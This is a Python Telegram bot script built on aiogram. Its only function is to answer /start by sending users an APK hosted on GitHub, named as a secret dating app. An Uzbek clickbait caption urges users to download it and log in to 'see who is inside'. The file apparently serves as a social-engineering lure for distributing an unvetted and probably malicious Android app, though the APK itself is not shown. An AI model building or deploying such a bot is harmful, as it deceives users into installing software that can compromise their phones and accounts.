import os
import asyncio
from aiogram import Bot, Dispatcher
from aiogram.types import Message
from aiogram.filters import CommandStart
from aiogram.client.session.aiohttp import AiohttpSession

TOKEN = os.environ["BOT_TOKEN"]

session = AiohttpSession(timeout=300)
bot = Bot(token=TOKEN, session=session)
dp = Dispatcher()

@dp.message(CommandStart())
async def start(message: Message):
    await message.answer_document(
        document="https://raw.githubusercontent.com/annavladimirovnaoreh1962-lang/Datuz/main/MaxfiyTanishuvlar.apk",
        caption="🇺🇿 Ichkarida kim borligini ko'rmoqchisanmi? Ilovani yuklab ol va kir 👀🔥"
    )

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
